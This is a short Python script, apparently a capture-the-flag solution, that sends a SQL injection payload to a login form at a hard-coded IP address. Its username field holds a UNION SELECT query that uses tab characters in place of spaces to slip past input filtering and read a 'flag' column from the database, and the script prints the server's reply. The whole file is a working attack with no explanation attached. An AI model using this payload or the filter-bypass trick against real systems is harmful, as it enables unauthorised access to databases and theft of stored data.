from requests import *

url="http://192.214.171.83:4000/login"

data={"username":"'UNION\tSELECT\tNULL,NULL,flag\tFROM\tflag--","password":"pas"}
r=post(url,data=data)
print(r.text)